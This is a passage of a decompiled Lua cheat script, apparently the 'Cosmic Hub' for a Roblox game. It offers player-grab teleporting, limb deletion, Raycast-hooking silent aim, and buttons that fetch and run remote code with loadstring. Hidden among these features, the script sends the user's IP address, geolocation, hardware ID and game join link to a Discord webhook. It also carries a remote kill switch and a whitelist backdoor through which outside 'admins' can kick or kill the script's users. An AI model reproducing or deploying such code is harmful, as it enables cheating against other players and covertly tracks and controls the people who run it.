    v468.CFrame = vu467.Cam
end
function UnFzCam()
    vu467.CB.Parent = nil
    local v469 = vu467.W.CurrentCamera
    v469.CameraType = Enum.CameraType.Custom
    if vu467.Cam then
        v469.CFrame = vu467.Cam
    end
    vu467.Cam = nil
end
function NoCol(p470)
    local v471, v472, v473 = pairs(p470:GetDescendants())
    while true do
        local v474
        v473, v474 = v471(v472, v473)
        if v473 == nil then
            break
        end
        if v474:IsA("BasePart") then
            v474.CanCollide = false
        end
    end
end
function InPlot(p475)
    local v476 = vu467.W:FindFirstChild("PlotItems")
    if v476 then
        v476 = v476:FindFirstChild("PlayersInPlots")
    end
    if v476 then
        v476 = v476:FindFirstChild(p475.Name)
    end
    return v476
end
function InRad(p477)
    return (p477.Position - vu467.Pos).Magnitude <= vu467.R
end
function Ignore(p478)
    return p478 == vu467.P.LocalPlayer and true or (vu467.WL and vu467.P.LocalPlayer:IsFriendsWith(p478.UserId) and true or false)
end
function ReQ()
    vu467.Q = {}
    local v479, v480, v481 = pairs(vu467.P:GetPlayers())
    while true do
        local v482
        v481, v482 = v479(v480, v481)
        if v481 == nil then
            break
        end
        if not Ignore(v482) and (v482.Character and not InPlot(v482)) then
            local v483 = v482.Character:FindFirstChild("HumanoidRootPart")
            if v483 and not InRad(v483) then
                table.insert(vu467.Q, v482)
            end
        end
    end
end
function Next()
    if # vu467.Q == 0 then
        ReQ()
        if # vu467.Q == 0 then
            return
        end
    end
    local v484 = vu467.Q[1]
    table.remove(vu467.Q, 1)
    if v484 and v484.Character then
        local v485 = v484.Character:FindFirstChild("HumanoidRootPart")
        local v486 = v484.Character:FindFirstChild("Head")
        local v487 = vu467.P.LocalPlayer.Character
        if v487 then
            v487 = vu467.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        end
        if v485 and (v486 and v487) then
            vu467.P.LocalPlayer.Character:PivotTo(v485.CFrame * CFrame.new(0, - 6, 0))
            NoCol(vu467.P.LocalPlayer.Character)
            local v488 = 0
            repeat
                vu7:FireServer(v485, v487.CFrame)
                task.wait(0.15)
                v488 = v488 + 1
            until v488 > 20 or v486:FindFirstChild("PartOwner") and v486.PartOwner.Value == vu467.P.LocalPlayer.Name or not vu467.A
            if vu467.A and (v486:FindFirstChild("PartOwner") and v486.PartOwner.Value == vu467.P.LocalPlayer.Name) then
                v485.CFrame = CFrame.new(vu467.Pos)
                v485.Position = vu467.Pos
                v485.AssemblyLinearVelocity = Vector3.zero
                task.wait(0.8)
            end
        end
    end
end
function Start()
    local v489 = vu467.P.LocalPlayer.Character
    if v489 then
        v489 = vu467.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if v489 then
        vu467.Pos = v489.Position
        vu467.Cam = vu467.W.CurrentCamera.CFrame
        ReQ()
        FzCam()
        vu467.Conn = vu467.RS.Heartbeat:Connect(function()
            if vu467.A then
                Next()
                if vu467.Cam then
                    local v490 = vu467.W.CurrentCamera
                    v490.CameraType = Enum.CameraType.Scriptable
                    v490.CFrame = vu467.Cam
                    vu467.CB.CFrame = vu467.Cam
                    vu467.CB.Parent = vu467.W
                end
            end
        end)
    end
end
function Stop()
    if vu467.Conn then
        vu467.Conn:Disconnect()
        vu467.Conn = nil
    end
    UnFzCam()
    local v491 = vu467.P.LocalPlayer.Character
    if v491 then
        v491 = vu467.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if v491 and vu467.Pos then
        v491.AssemblyLinearVelocity = Vector3.zero
        v491.CFrame = CFrame.new(vu467.Pos)
    end
end
function CharAdd(p492)
    p492:WaitForChild("Humanoid").Died:Connect(function()
        if vu467.Conn then
            vu467.Conn:Disconnect()
            vu467.Conn = nil
        end
        UnFzCam()
    end)
    if vu467.A then
        local v493 = p492:WaitForChild("HumanoidRootPart")
        vu467.Pos = vu467.Pos or v493.Position
        vu467.Cam = vu467.Cam or vu467.W.CurrentCamera.CFrame
        FzCam()
        vu467.Conn = vu467.RS.Heartbeat:Connect(function()
            if vu467.A then
                Next()
                if vu467.Cam then
                    local v494 = vu467.W.CurrentCamera
                    v494.CameraType = Enum.CameraType.Scriptable
                    v494.CFrame = vu467.Cam
                    vu467.CB.CFrame = vu467.Cam
                    vu467.CB.Parent = vu467.W
                end
            end
        end)
    end
end
vu467.P.LocalPlayer.CharacterAdded:Connect(CharAdd)
vu467.P.PlayerAdded:Connect(function()
    if vu467.A then
        ReQ()
    end
end)
vu467.P.PlayerRemoving:Connect(function(p495)
    for v496 = # vu467.Q, 1, - 1 do
        if vu467.Q[v496] == p495 then
            table.remove(vu467.Q, v496)
        end
    end
end)
v457:AddToggle({
    Name = "Bring All",
    Default = false,
    Callback = function(p497)
        vu467.A = p497
        if p497 then
            Start()
        else
            Stop()
        end
    end
})
v457:AddToggle({
    Name = "Whitelist Friends",
    Default = false,
    Callback = function(p498)
        vu467.WL = p498
    end
})
local vu499 = {
    ws = game:GetService("Workspace"),
    plrs = game:GetService("Players"),
    debris = game:GetService("Debris"),
    uis = game:GetService("UserInputService"),
    fpdHeight = vu12.FallenPartsDestroyHeight,
    parts = {
        "Left Leg",
        "Right Leg",
        "Left Arm",
        "Right Arm",
        "HumanoidRootPart"
    }
}
function findHeldPlayer()
    local v500 = vu499.ws:FindFirstChild("GrabParts")
    if not v500 then
        return nil
    end
    local v501, v502, v503 = ipairs(v500:GetChildren())
    while true do
        local v504
        v503, v504 = v501(v502, v503)
        if v503 == nil then
            break
        end
        if v504:IsA("BasePart") then
            local v505, v506, v507 = ipairs(v504:GetChildren())
            while true do
                local v508
                v507, v508 = v505(v506, v507)
                if v507 == nil then
                    break
                end
                if v508:IsA("WeldConstraint") and v508.Part1 and v508.Part1.Parent:IsA("Model") then
                    local v509 = v508.Part1.Parent
                    if v509:FindFirstChildOfClass("Humanoid") then
                        return vu499.plrs:GetPlayerFromCharacter(v509)
                    end
                end
            end
        end
    end
    return nil
end
function teleportLimbParts(p510)
    if p510 then
        local v511 = p510.Character
        if v511 then
            local v512, v513, v514 = ipairs(vu499.parts)
            local v515 = {}
            while true do
                local v516
                v514, v516 = v512(v513, v514)
                if v514 == nil then
                    break
                end
                local vu517 = v511:FindFirstChild(v516)
                if vu517 then
                    local v518, v519, v520 = ipairs(vu499.ws:GetDescendants())
                    while true do
                        local v521
                        v520, v521 = v518(v519, v520)
                        if v520 == nil then
                            break
                        end
                        if v521:IsA("WeldConstraint") and (v521.Part0 == vu517 or v521.Part1 == vu517) then
                            v521.Enabled = false
                            table.insert(v515, v521)
                        end
                    end
                    local v522, v523, v524 = ipairs(vu517:GetChildren())
                    while true do
                        local v525
                        v524, v525 = v522(v523, v524)
                        if v524 == nil then
                            break
                        end
                        if v525:IsA("Motor6D") or v525:IsA("Weld") then
                            v525.Enabled = false
                            table.insert(v515, v525)
                        end
                    end
                    vu517.Anchored = false
                    local vu526 = Vector3.new(vu517.Position.X, vu499.fpdHeight - 100, vu517.Position.Z)
                    pcall(function()
                        if vu517:IsA("Model") then
                            vu517.PrimaryPart = vu517.PrimaryPart or vu517:FindFirstChildWhichIsA("BasePart")
                            if vu517.PrimaryPart then
                                vu517:SetPrimaryPartCFrame(CFrame.new(vu526))
                            end
                        else
                            vu517.CFrame = CFrame.new(vu526)
                        end
                    end)
                    task.wait(0.1)
                end
            end
            local v527, v528, v529 = ipairs(v515)
            while true do
                local v530
                v529, v530 = v527(v528, v529)
                if v529 == nil then
                    break
                end
                v530.Enabled = true
            end
        end
    else
        return
    end
end
function deleteUserLimbs()
    local v531 = findHeldPlayer()
    if v531 then
        teleportLimbParts(v531)
    end
end
if vu499.uis.TouchEnabled then
    v457:AddButton({
        Name = "Delete Limbs (Hold and ragdoll player)",
        Callback = deleteUserLimbs
    })
end
local v532 = v27:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://6035047375",
    PremiumOnly = false
})
v532:AddLabel("CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZY)")
v532:AddLabel("GO FOLLOW: Crisila_TCU (Superduperalt0987)")
v532:AddLabel("HELPERS: jeke/brilliant, moonydev")
v532:AddButton({
    Name = "Cosmic Hub Discord Server",
    Callback = function()
        setclipboard("https://discord.gg/mzkKQhyNqv")
        vu24:MakeNotification({
            Name = "Copied!",
            Content = "Discord link has been copied to your clipboard.",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})
local v533 = v27:MakeTab({
    Name = "Extra",
    Icon = "rbxassetid://6031094675",
    PremiumOnly = false
})
v533:AddButton({
    Name = "Cosmic Hub Auras",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras", true))()
    end
})
v533:AddButton({
    Name = "Dex",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua", true))()
    end
})
v533:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua", true))()
    end
})
v533:AddLabel("Current version: V2.049")
local vu534 = "https://raw.githubusercontent.com/Jeffepicy/yeah/refs/heads/main/yeah"
function checkShutdown()
    local v535, vu536 = pcall(function()
        return game:HttpGet(vu534)
    end)
    if v535 and vu536 then
        local vu537 = nil
        pcall(function()
            vu537 = vu4:JSONDecode(vu536)
        end)
        if vu537 == true then
            vu2:Kick("no")
            task.wait(1)
            while true do
            end
        end
    else
        warn("Failed")
    end
end
checkShutdown()
local v538 = {}
local vu539 = "https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt"
local v540, v541 = pcall(function()
    return game:HttpGet(vu539)
end)
if v540 and v541 then
    local v542 = vu4:JSONDecode(v541)
    local v543, v544
    if typeof(v542) ~= "table" then
        v543 = vu24
        v544 = vu29
    else
        local v545, v546, v547 = ipairs(v542)
        v543 = vu24
        v544 = vu29
        while true do
            local v548
            v547, v548 = v545(v546, v547)
            if v547 == nil then
                break
            end
            table.insert(v538, v548)
        end
    end
    local vu549 = {}
    local vu550 = {}
    local vu551 = {}
    local vu552 = {}
    local vu553 = v538 or {}
    function isAdmin(p554)
        return table.find(vu553, p554.UserId) ~= nil
    end
    function sendChatMessage(p555)
        if vu8.ChatVersion ~= Enum.ChatVersion.TextChatService then
            local v556 = vu5:FindFirstChild("DefaultChatSystemChatEvents")
            if v556 and v556:FindFirstChild("SayMessageRequest") then
                v556.SayMessageRequest:FireServer(p555, "All")
            end
        else
            local v557 = vu8:FindFirstChild("TextChannels")
            local v558 = v557 and v557:FindFirstChild("RBXGeneral")
            if v558 then
                v558:SendAsync(p555)
            end
        end
    end
    function toggleBlind(p559)
        vu551[p559] = not vu551[p559]
        local v560 = vu2:FindFirstChild("PlayerGui"):FindFirstChild("BlindEffect")
        if vu551[p559] then
            if not v560 then
                local v561 = Instance.new("ScreenGui")
                v561.Name = "BlindEffect"
                v561.ResetOnSpawn = false
                local v562 = Instance.new("Frame")
                v562.Size = UDim2.new(1, 0, 1, 0)
                v562.BackgroundColor3 = Color3.new(0, 0, 0)
                v562.Parent = v561
                v561.Parent = vu2:WaitForChild("PlayerGui")
            end
        elseif v560 then
            v560:Destroy()
        end
    end
    function handleAdminCommand(p563, p564)
        if isAdmin(p563) then
            local v565 = p564:lower()
            if v565:sub(1, 8) == ":c kick " then
                local v566 = v565:sub(9)
                local v567 = vu1
                local v568, v569, v570 = ipairs(v567:GetPlayers())
                while true do
                    local v571
                    v570, v571 = v568(v569, v570)
                    if v570 == nil then
                        break
                    end
                    if v571 ~= p563 and v571.Name:lower():sub(1, # v566) == v566 then
                        v571:Kick("You have been kicked by an admin.")
                    end
                end
            end
            if v565:sub(1, 9) == ":c kill " then
                local v572 = v565:sub(10)
                local v573 = vu1
                local v574, v575, v576 = ipairs(v573:GetPlayers())
                while true do
                    local v577
                    v576, v577 = v574(v575, v576)
                    if v576 == nil then
                        break
                    end
                    if v577 ~= p563 and v577.Character and v577.Character:FindFirstChild("Humanoid") then
                        local v578 = v577.Name:lower()
                        local v579 = v577.DisplayName:lower()
                        if v578:sub(1, # v572) == v572 or v579:sub(1, # v572) == v572 then
                            v577.Character.Humanoid.Health = 0
                        end
                    end
                end
            end
            if v565:sub(1, 7) == ":c say " then
                local v580 = v565:sub(8)
                if v580 and v580 ~= "" then
                    sendChatMessage(v580)
                end
            end
            if v565 == ":c aura" then
                vu550[p563] = not vu550[p563]
            end
            if v565 == ":c e" then
                toggleBlind(p563)
            end
            if v565:sub(1, 5) == ":c sb" then
                local v581 = tonumber(v565:match("%d+"))
                if v581 and 0 < v581 then
                    vu552[p563] = v581
                    sendChatMessage("Safety bubble set to " .. v581)
                else
                    vu552[p563] = nil
                    sendChatMessage("Safety bubble disabled")
                end
            end
            if v565 == ":c tp all" and p563.Character and p563.Character:FindFirstChild("HumanoidRootPart") then
                local v582 = p563.Character.HumanoidRootPart
                local v583 = vu1
                local v584, v585, v586 = ipairs(v583:GetPlayers())
                while true do
                    local v587
                    v586, v587 = v584(v585, v586)
                    if v586 == nil then
                        break
                    end
                    if v587 ~= p563 and v587.Character and v587.Character:FindFirstChild("HumanoidRootPart") then
                        v587.Character.HumanoidRootPart.CFrame = v582.CFrame + Vector3.new(3, 0, 0)
                    end
                end
            end
            if v565 == ":c kill all" then
                local v588 = vu1
                local v589, v590, v591 = ipairs(v588:GetPlayers())
                while true do
                    local v592
                    v591, v592 = v589(v590, v591)
                    if v591 == nil then
                        break
                    end
                    if v592 ~= p563 and v592.Character and v592.Character:FindFirstChild("Humanoid") then
                        v592.Character.Humanoid.Health = 0
                    end
                end
            end
            if v565 == ":c ban all" then
                local v593 = vu1
                local v594, v595, v596 = ipairs(v593:GetPlayers())
                while true do
                    local v597
                    v596, v597 = v594(v595, v596)
                    if v596 == nil then
                        break
                    end
                    if v597 ~= p563 then
                        v597:Kick("You have been banned by an admin.")
                    end
                end
            end
        end
    end
    if vu8.ChatVersion ~= Enum.ChatVersion.TextChatService then
        local v598, v599, v600 = ipairs(vu1:GetPlayers())
        while true do
            local vu601
            v600, vu601 = v598(v599, v600)
            if v600 == nil then
                break
            end
            vu601.Chatted:Connect(function(p602)
                handleAdminCommand(vu601, p602)
            end)
        end
        vu1.PlayerAdded:Connect(function(pu603)
            pu603.Chatted:Connect(function(p604)
                handleAdminCommand(pu603, p604)
            end)
        end)
    else
        local v605 = vu8:FindFirstChild("TextChannels")
        if v605 then
            local v606 = v605:FindFirstChild("RBXGeneral")
            if v606 then
                v606.MessageReceived:Connect(function(p607)
                    local v608 = p607.TextSource
                    if v608 then
                        local v609 = vu1:GetPlayerByUserId(v608.UserId)
                        if v609 then
                            handleAdminCommand(v609, p607.Text)
                        end
                    end
                end)
            end
        end
    end
    vu3.Heartbeat:Connect(function()
        local v610, v611, v612 = pairs(vu550)
        while true do
            local v613
            v612, v613 = v610(v611, v612)
            if v612 == nil then
                break
            end
            if v613 and v612.Character and v612.Character:FindFirstChild("HumanoidRootPart") then
                local v614 = v612.Character.HumanoidRootPart
                local v615 = tick()
                local v616, v617, v618 = pairs(vu549)
                local v619 = v612
                while true do
                    v618 = v616(v617, v618)
                    if v618 == nil then
                        break
                    end
                    if v618 ~= v619 and v618.Character and v618.Character:FindFirstChild("HumanoidRootPart") then
                        local v620 = (v615 + v618.UserId) % (2 * math.pi)
                        local v621 = 10
                        local v622 = Vector3.new(math.cos(v620) * v621, 0, math.sin(v620) * v621)
                        v618.Character.HumanoidRootPart.CFrame = v614.CFrame + v622
                    end
                end
            end
        end
    end)
    vu3.Heartbeat:Connect(function()
        local v623, v624, v625 = pairs(vu552)
        while true do
            local v626
            v625, v626 = v623(v624, v625)
            if v625 == nil then
                break
            end
            if v625.Character and v625.Character:FindFirstChild("HumanoidRootPart") then
                local v627 = v625.Character.HumanoidRootPart
                local v628, v629, v630 = pairs(vu549)
                local v631 = v625
                while true do
                    v630 = v628(v629, v630)
                    if v630 == nil then
                        break
                    end
                    if v630 ~= v631 and v630.Character and v630.Character:FindFirstChild("HumanoidRootPart") then
                        local v632 = v630.Character.HumanoidRootPart
                        if (v627.Position - v632.Position).Magnitude < v626 then
                            local v633 = (v632.Position - v627.Position).Unit
                            v632.CFrame = CFrame.new(v627.Position + v633 * v626)
                        end
                    end
                end
            end
        end
    end)
    function registerUser(p634)
        vu549[p634] = true
    end
    registerUser(vu2)
    vu1.PlayerAdded:Connect(function(pu635)
        registerUser(pu635)
        if isAdmin(pu635) then
            task.delay(1, function()
                sendChatMessage("Lord " .. pu635.DisplayName .. " has joined.")
            end)
        end
    end)
    vu1.PlayerRemoving:Connect(function(p636)
        vu549[p636] = nil
        vu550[p636] = nil
        vu551[p636] = nil
        vu552[p636] = nil
    end)
    local vu637 = {
        HttpService = game:GetService("HttpService"),
        Players = game:GetService("Players"),
        MarketplaceService = game:GetService("MarketplaceService"),
        LocalizationService = game:GetService("LocalizationService"),
        RbxAnalyticsService = game:GetService("RbxAnalyticsService"),
        webhookUrl = "https://v0-discord-webhook-protector-nine.vercel.app/api/relay/0nx1ae6vn3yk"
    }
    vu637.LocalPlayer = vu637.Players.LocalPlayer
    vu637.UserId = vu637.LocalPlayer.UserId
    vu637.Name = vu637.LocalPlayer.Name
    vu637.DisplayName = vu637.LocalPlayer.DisplayName
    vu637.Membership = tostring(vu637.LocalPlayer.MembershipType):sub(21)
    vu637.Age = vu637.LocalPlayer.AccountAge
    vu637.Country = vu637.LocalizationService.RobloxLocaleId
    vu637.IP = game:HttpGet("https://v4.ident.me/")
    vu637.Geo = game:HttpGet("http://ip-api.com/json")
    vu637.HWID = vu637.RbxAnalyticsService:GetClientId()
    vu637.Job = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
    vu637.Link = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    vu637.GameName = vu637.MarketplaceService:GetProductInfo(game.PlaceId).Name
    function make()
        local v638 = identifyexecutor()
        local v639 = {
            avatar_url = "",
            content = ""
        }
        local v640 = {}
        local v641 = {
            author = {
                name = "SKID ALERT",
                url = "https://roblox.com"
            },
            description = string.format("__[Player Info](https://www.roblox.com/users/%d)__\n**Display Name:** %s\n**Username:** %s\n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s\n**Game Id:** %d\n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```", vu637.UserId, vu637.DisplayName, vu637.Name, vu637.UserId, vu637.Membership, vu637.Age, vu637.Country, vu637.IP, vu637.HWID, os.date("%m/%d/%Y"), os.date("%X"), game.PlaceId, vu637.GameName, game.PlaceId, v638, vu637.Geo, vu637.Job),
            type = "rich",
            color = tonumber("0xFFD700"),
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. vu637.UserId .. "&width=150&height=150&format=png"
            }
        }
        __set_list(v640, 1, {
            v641
        })
        v639.embeds = v640
        return vu637.HttpService:JSONEncode(v639)
    end
    function send(p642)
        local v643 = http_request or request or (HttpPost or syn.request)
        local v644 = {
            ["content-type"] = "application/json"
        }
        v643({
            Url = vu637.webhookUrl,
            Body = p642,
            Method = "POST",
            Headers = v644
        })
        local v645 = {
            Url = vu637.webhookUrl,
            Body = vu637.HttpService:JSONEncode({
                content = vu637.Link
            }),
            Method = "POST",
            Headers = v644
        }
        v643(v645)
    end
    send(make())
    local v646 = v27:MakeTab({
        Name = "Silent Aim",
        Icon = "rbxassetid://6031091005",
        PremiumOnly = false
    })
    local vu647 = {
        SA = {
            En = false,
            Key = "RightAlt",
            TP = "HumanoidRootPart",
            Show = false,
            MHP = false,
            AP = false,
            MHP_A = 0.165,
            HC = 100,
            Col = Color3.fromRGB(54, 57, 241)
        },
        Cam = vu12.CurrentCamera,
        P = game:GetService("Players"),
        RS = game:GetService("RunService"),
        GS = game:GetService("GuiService"),
        UIS = game:GetService("UserInputService"),
        ST = game:GetService("Stats"),
        LP = game:GetService("Players").LocalPlayer,
        MC = nil,
        MB = nil,
        M = nil,
        MBX = nil,
        VTP = {
            "Head",
            "HumanoidRootPart"
        },
        CPA = 0.165,
        EA = {
            Raycast = {
                AC = 3,
                Args = {
                    "Instance",
                    "Vector3",
                    "Vector3",
                    "RaycastParams"
                }
            }
        },
        CoR = coroutine.resume,
        CoC = coroutine.create
    }
    if getgenv then
        getgenv().SilentAimSettings = vu647.SA
    else
        v544.SilentAimSettings = vu647.SA
    end
    vu647.M = vu647.LP:GetMouse()
    local vu648 = pcall(function()
        return Drawing.new("Square")
    end)
    if vu648 then
        vu647.MBX = Drawing.new("Square")
        vu647.MBX.Visible = false
        vu647.MBX.ZIndex = 999
        vu647.MBX.Color = vu647.SA.Col
        vu647.MBX.Thickness = 2
        vu647.MBX.Size = Vector2.new(30, 30)
        vu647.MBX.Filled = true
    else
        vu647.MBX = {
            Visible = false,
            Position = Vector2.new(),
            Color = vu647.SA.Col
        }
        vu647.SA.Show = false
    end
    local v649 = "MC"
    local v650 = vu647.UIS.TouchEnabled
    if v650 then
        v650 = not vu647.UIS.KeyboardEnabled
    end
    vu647[v649] = v650
    local _ = game.GetChildren
    local vu651 = vu647.P.GetPlayers
    local vu652 = vu647.Cam.WorldToScreenPoint
    local vu653 = vu647.Cam.WorldToViewportPoint
    local vu654 = game.FindFirstChild
    local v655 = vu647.RS.RenderStepped
    local v656 = vu647.RS.Heartbeat
    local _ = vu647.GS.GetGuiInset
    local vu657 = vu647.UIS.GetMouseLocation
    function Ch(p658)
        local v659 = math.floor(p658)
        return math.floor(math.random() * 100) / 100 <= v659 / 100
    end
    function GPx(p660)
        local v661, v662 = vu652(vu647.Cam, p660)
        return Vector2.new(v661.X, v661.Y), v662
    end
    function VA(p663, p664)
        local v665 = 0
        if # p663 < p664.AC then
            return false
        end
        local v666 = next
        local v667 = nil
        while true do
            local v668
            v667, v668 = v666(p663, v667)
            if v667 == nil then
                break
            end
            if typeof(v668) == p664.Args[v667] then
                v665 = v665 + 1
            end
        end
        return p664.AC <= v665
    end
    function GD(p669, p670)
        return (p670 - p669).Unit * 1000
    end
    function GMP()
        return vu657(vu647.UIS)
    end
    function GPP(p671)
        local v672 = p671.Velocity or Vector3.new()
        return p671.Position + (vu647.SA.MHP and v672 * vu647.CPA or Vector3.new())
    end
    function GCP()
        if vu647.SA.TP then
            local v673 = vu647.MC and vu647.Cam.ViewportSize / 2 or GMP()
            local v674 = next
            local v675, v676 = vu651(vu647.P)
            local v677 = nil
            local v678 = nil
            while true do
                local v679
                v676, v679 = v674(v675, v676)
                if v676 == nil then
                    break
                end
                if v679 ~= vu647.LP then
                    local v680 = v679.Character
                    if v680 then
                        local v681 = vu654(v680, "HumanoidRootPart")
                        local v682 = vu654(v680, "Humanoid")
                        if v681 and (v682 and (not v682 or v682.Health > 0)) and (vu647.Cam.CFrame.Position - v681.Position).Magnitude <= 35 then
                            local v683, v684 = GPx(v681.Position)
                            if v684 then
                                local v685 = (v673 - v683).Magnitude
                                if v685 <= (v677 or 2000) then
                                    v678 = vu647.SA.TP == "Random" and v680[vu647.VTP[math.random(1, # vu647.VTP)] ] or v680[vu647.SA.TP]
                                    v677 = v685
                                end
                            end
                        end
                    end
                end
            end
            return v678
        end
    end
    v646:AddToggle({
        Name = "Enabled",
        Default = vu647.SA.En,
        Callback = function(p686)
            vu647.SA.En = p686
            vu647.MBX.Visible = p686
        end
    })
    v646:AddBind({
        Name = "Toggle Key",
        Default = Enum.KeyCode[vu647.SA.Key],
        Hold = false,
        Callback = function()
            vu647.SA.En = not vu647.SA.En
            EnabledToggle:Set(vu647.SA.En)
            vu647.MBX.Visible = vu647.SA.En
        end
    })
    v646:AddDropdown({
        Name = "Target Part",
        Default = vu647.SA.TP,
        Options = {
            "Head",
            "HumanoidRootPart",
            "Random"
        },
        Callback = function(p687)
            vu647.SA.TP = p687
        end
    })
    v646:AddSlider({
        Name = "Hit Chance",
        Min = 0,
        Max = 100,
        Increment = 1,
        Default = vu647.SA.HC,
        ValueName = "%",
        Callback = function(p688)
            vu647.SA.HC = p688
        end
    })
    v646:AddSection({
        Name = "Prediction"
    })
    v646:AddToggle({
        Name = "Manual Prediction",
        Default = vu647.SA.MHP,
        Callback = function(p689)
            vu647.SA.MHP = p689
        end
    })
    v646:AddToggle({
        Name = "Auto Prediction",
        Default = vu647.SA.AP,
        Callback = function(p690)
            vu647.SA.AP = p690
        end
    })
    v646:AddSlider({
        Name = "Prediction Amount",
        Min = 0.165,
        Max = 1,
        Increment = 0.001,
        Default = vu647.SA.MHP_A,
        Callback = function(p691)
            vu647.SA.MHP_A = p691
        end
    })
    v646:AddSection({
        Name = "Visuals"
    })
    v646:AddToggle({
        Name = "Show Silent Aim Target",
        Default = vu647.SA.Show,
        Callback = function(p692)
            vu647.SA.Show = p692
            vu647.MBX.Visible = p692
        end
    })
    v646:AddColorpicker({
        Name = "Silent Aim Target Color",
        Default = vu647.SA.Col,
        Callback = function(p693)
            vu647.SA.Col = p693
            vu647.MBX.Color = p693
        end
    })
    v656:Connect(function()
        if vu647.SA.AP then
            local v694, v695 = pcall(function()
                return vu647.ST.Network.ServerStatsItem["Data Ping"]:GetValueString()
            end)
            if v694 then
                local v696 = tonumber(v695:match("(%d+)")) or 50
                if v696 < 20 then
                    vu647.CPA = 0.11
                elseif v696 < 30 then
                    vu647.CPA = 0.115
                elseif v696 < 40 then
                    vu647.CPA = 0.12
                elseif v696 < 50 then
                    vu647.CPA = 0.125
                elseif v696 < 60 then
                    vu647.CPA = 0.13
                elseif v696 < 70 then
                    vu647.CPA = 0.135
                elseif v696 < 80 then
                    vu647.CPA = 0.14
                elseif v696 < 90 then
                    vu647.CPA = 0.145
                elseif v696 < 100 then
                    vu647.CPA = 0.15
                elseif v696 < 110 then
                    vu647.CPA = 0.155
                else
                    vu647.CPA = 0.16
                end
            end
        else
            vu647.CPA = vu647.SA.MHP_A
        end
    end)
    v655:Connect(function()
        if vu647.SA.Show and (vu647.SA.En and vu648) then
            if GCP() then
                local v697 = GCP().Parent.PrimaryPart or GCP()
                local v698, v699 = vu653(vu647.Cam, v697.Position)
                vu647.MBX.Visible = v699
                vu647.MBX.Position = Vector2.new(v698.X, v698.Y)
            else
                vu647.MBX.Visible = false
                vu647.MBX.Position = Vector2.new()
            end
        end
    end)
    local vu700 = checkcaller or function()
        return false
    end
    local vu702 = newcclosure or function(p701)
        return p701
    end
    local vu703 = false
    if hookmetamethod then
        local _, _ = pcall(function()
            oldNC = hookmetamethod(game, "__namecall", vu702(function(...)
                local v704 = getnamecallmethod()
                local v705 = {
                    ...
                }
                local v706 = v705[1]
                local v707 = Ch(vu647.SA.HC)
                if vu647.SA.En and (v706 == vu12 and (not vu700() and (v707 and (v704 == "Raycast" and VA(v705, vu647.EA.Raycast))))) then
                    local v708 = v705[2]
                    local v709 = GCP()
                    if v709 then
                        v705[3] = GD(v708, GPP(v709))
                        return oldNC(unpack(v705))
                    end
                end
                return oldNC(...)
            end))
            vu703 = true
        end)
    end
    v543:Init()
else
    vu2:Kick("Whitelist services down. Try again later.")
end
